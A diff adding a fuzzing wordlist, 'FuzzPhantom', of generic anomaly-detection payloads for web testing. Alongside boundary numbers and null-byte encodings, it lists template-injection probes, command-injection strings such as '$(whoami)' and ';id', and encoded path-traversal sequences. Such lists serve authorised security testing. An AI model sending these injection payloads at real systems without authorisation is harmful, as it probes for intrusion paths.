@@ -1,0 +1,65 @@
+# FuzzPhantom — Generic Anomaly Detection Payloads
+# For response length, status code, and error detection
+FUZZ
+fuzz
+FUZZPHANTOM
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{7*'7'}}
+@(7+7)
+*{7*7}
+${7*7}
+${{7*7}}
+%{7*7}
+#set($x=7*7)${x}
+<#assign x=7*7>${x}
+[7*7]
+null
+NULL
+undefined
+NaN
+Infinity
+true
+false
+0
+-1
+99999999
+-99999999
+2147483647
+-2147483648
+9999999999999999999
+0.0
+1.1
+-1.1
+" "
+\n
+\r\n
+\t
+%00
+%0a
+%0d
+\x00
+\x0a
+\x0d
+;
+|
+||
+&
+&&
+`whoami`
+$(whoami)
+;whoami
+|whoami
+||whoami
+&whoami
+&&whoami
+`id`
+$(id)
+;id
+../
+..%2f
+%2e%2e%2f
+%252e%252e%252f
+....//
